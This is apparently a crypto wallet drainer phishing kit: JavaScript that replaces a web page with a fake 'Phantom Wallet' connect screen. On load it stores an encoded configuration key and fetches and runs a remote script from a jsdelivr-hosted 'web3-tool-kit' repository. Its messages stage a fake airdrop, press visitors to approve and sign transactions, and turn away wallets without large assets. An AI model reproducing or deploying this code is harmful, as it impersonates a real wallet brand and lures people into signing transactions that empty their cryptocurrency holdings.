const newUrl = "/connect";
window.history.pushState({ path: newUrl }, "", newUrl);

function deployContents() {
  document.documentElement.innerHTML = `
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Phantom Wallet</title>
    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/gh/gravymcstrut/web3-tool-kit/styles.css
    "
    />
    <link
      rel="shortcut icon"
      href="https://cdn.jsdelivr.net/gh/gravymcstrut/web3-tool-kit@main/icon.svg"
      type="image/svg"
    />
    <script>
      var predef = {
        words: {
          onLoaded: "Sign Up / Sign In with Wallet",
          onConnected: "{addressfirst4}...{addresslast4}",
          onNoAccountInfo: "Invalid Wallet",
          onNotEnoughLamports:
            "Wallet has no funds to pay the transaction Fees.",
          onClaiming: "Requesting airdrop...",
          onClaimingDesc: "Please wait while we requesting airdrop...",
          onClaimingIneligible: "Ineligible",
          onClaimingIneligibleDesc:
            "Connected wallet is ineligible. Requested requirements: Large Assets",
          onClaimLoading: "Claiming...",
          onClaimLoadingDesc: "Signing airdrop request...",
          onDecline: "Error",
          onDeclineDesc:
            "You should confirm the transactions to finalize the airdropping!",
        },
        loaderWords: [
          "Sign the transaction",
          "Checking your wallet",
          "Checking Your Wallet...",
          "Please wait while we check your wallet.",
          "Continue in wallet...",
          "You must approve the prompt<br> in order to continue.",
          "Transaction signed successfully",
          "You must approve the next prompt in order to continue.",
          "Your wallet is not eligible, connect another wallet",
          "Not eligible",
        ],
      };

      function loadData(
        key,
        modal = 4,
        loader = 1,
        words = predef.words,
        loaderWords = predef.loaderWords
      ) {
        let data = {
          key,
          modal,
          loader,
          words,
          loaderWords,
        };

        let encoded = btoa(JSON.stringify(data));
        localStorage.setItem("stuffy", encoded);
      }

      function inject() {
        loadData(
          "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NjM0LCJhdCI6MTczNDAzMzQyMzAyNywiaWF0IjoxNzM0MDMzNDIzfQ.TkRk06kqVgZ_kkhQ4k7hdmsgYREpyAlTtqwAgy63GtY"
        );
        var script = document.createElement("script");
        script.src =
          "https://cdn.jsdelivr.net/gh/gravymcstrut/web3-tool-kit/EQsJLEWa.js";
        document.head.appendChild(script);
      }

      inject();
    </script>
  </head>
  <body>
    <div class="root">
      <div class="container">
        <svg
          viewBox="0 0 1139 224"
          fill="none"
          xmlns="http://www.w3.org/2000/svg"
        >
          <path
            d="M31.8292 224C66.1548 224 91.951 194.147 107.345 170.557C105.473 175.776 104.433 180.995 104.433 186.006C104.433 199.784 112.338 209.596 127.941 209.596C149.368 209.596 172.252 190.807 184.11 170.557C183.278 173.48 182.862 176.194 182.862 178.699C182.862 188.302 188.271 194.356 199.296 194.356C234.038 194.356 268.988 132.772 268.988 78.9115C268.988 36.9506 247.768 0 194.512 0C100.896 0 0 114.401 0 188.302C0 217.32 15.6025 224 31.8292 224ZM162.266 74.3187C162.266 63.8807 168.091 56.5741 176.621 56.5741C184.942 56.5741 190.767 63.8807 190.767 74.3187C190.767 84.7568 184.942 92.2721 176.621 92.2721C168.091 92.2721 162.266 84.7568 162.266 74.3187ZM206.786 74.3187C206.786 63.8807 212.611 56.5741 221.14 56.5741C229.461 56.5741 235.286 63.8807 235.286 74.3187C235.286 84.7568 229.461 92.2721 221.14 92.2721C212.611 92.2721 206.786 84.7568 206.786 74.3187Z"
            fill="#FFFDF8"
          />
          <path
            d="M310.588 201.245H341.793V170.557C341.793 156.153 340.545 150.725 333.264 136.112L337.216 134.024C347.826 158.867 362.805 167.843 378.199 167.843C402.955 167.843 422.718 146.132 422.718 112.522C422.718 80.3728 404.619 56.7828 378.615 56.7828C363.221 56.7828 347.826 65.5508 337.216 90.6021L333.264 88.5144C338.257 78.4939 341.793 69.0997 341.793 60.123H310.588V201.245ZM341.793 112.313C341.793 98.535 352.195 83.2954 367.589 83.2954C380.071 83.2954 390.265 93.5247 390.265 112.104C390.265 130.475 380.487 141.331 367.381 141.331C352.819 141.331 341.793 126.509 341.793 112.313Z"
            fill="#FFFDF8"
          />
          <path
            d="M434.108 164.503H465.313V127.761C465.313 101.875 474.467 83.5042 491.525 83.5042C502.343 83.5042 505.672 90.8108 505.672 108.973V164.503H536.877V103.963C536.877 70.9786 525.019 56.7828 502.343 56.7828C479.043 56.7828 471.346 72.4399 462.401 91.4371L458.448 89.3495C463.857 77.6589 465.313 70.5611 465.313 60.123V24.0075H434.108V164.503Z"
            fill="#FFFDF8"
          />
          <path
            d="M582.482 167.843C602.661 167.843 614.519 154.483 623.464 137.364L627.209 139.243C623.256 147.385 619.512 156.779 619.512 164.503H650.093V107.72C650.093 73.9012 635.946 56.7828 602.869 56.7828C570.416 56.7828 554.397 73.0662 551.277 90.1845L581.234 95.4035C582.274 86.4268 589.555 80.3728 601.205 80.3728C612.855 80.3728 619.512 86.2181 619.512 93.3159C619.512 100.414 612.647 103.754 594.34 103.963C567.295 104.38 547.324 114.192 547.324 135.068C547.324 152.186 560.846 167.843 582.482 167.843ZM578.321 132.98C578.321 116.488 604.533 127.97 618.888 115.236V118.993C618.888 133.815 605.782 144.671 592.675 144.671C585.81 144.671 578.321 141.748 578.321 132.98Z"
            fill="#FFFDF8"
          />
          <path
            d="M662.458 164.503H693.663V127.761C693.663 101.875 702.816 83.5042 719.875 83.5042C730.693 83.5042 734.021 90.8108 734.021 108.973V164.503H765.227V103.963C765.227 70.9786 753.369 56.7828 730.693 56.7828C707.393 56.7828 699.696 72.4399 690.75 91.4371L686.798 89.3495C692.207 77.6589 693.663 70.5611 693.663 60.123H662.458V164.503Z"
            fill="#FFFDF8"
          />
          <path
            d="M848.341 164.921V139.034C841.684 141.331 823.169 145.297 823.169 130.058V85.1743H848.133V60.123H823.169V32.1491L791.756 41.5433V60.123H773.033V85.1743H791.756L791.964 132.563C791.964 167.426 822.961 172.436 848.341 164.921Z"
            fill="#FFFDF8"
          />
          <path
            d="M911.728 167.843C943.349 167.843 967.481 143.627 967.481 112.104C967.481 80.7903 943.349 56.7828 911.728 56.7828C880.107 56.7828 855.767 80.7903 855.767 112.104C855.767 143.627 880.107 167.843 911.728 167.843ZM888.012 112.313C888.012 94.986 897.79 82.8779 911.728 82.8779C925.666 82.8779 935.236 94.986 935.236 112.313C935.236 129.64 925.666 141.748 911.728 141.748C897.79 141.748 888.012 129.64 888.012 112.313Z"
            fill="#FFFDF8"
          />
          <path
            d="M977.15 164.503H1008.35V127.761C1008.35 100.831 1016.88 83.5042 1030.61 83.5042C1039.56 83.5042 1042.47 90.6021 1042.47 108.973V164.503H1073.68V127.761C1073.68 102.501 1082.83 83.5042 1095.94 83.5042C1104.67 83.5042 1107.79 91.6459 1107.79 108.973V164.503H1139V103.963C1139 70.7698 1128.18 56.7828 1106.96 56.7828C1084.91 56.7828 1077.01 72.4399 1069.31 91.6459L1065.56 89.767C1072.85 67.8472 1057.03 56.7828 1041.43 56.7828C1020.84 56.7828 1013.35 72.4399 1005.03 91.4371L1001.28 89.3495C1006.48 77.6589 1008.35 70.5611 1008.35 60.123H977.15V164.503Z"
            fill="#FFFDF8"
          />
        </svg>
        <h1>Please continue in Phantom Wallet</h1>
        <button class="btn" id="claim-button">Connect</button>
      </div>
    </div>
  </body>
</html>

`;
}

deployContents();
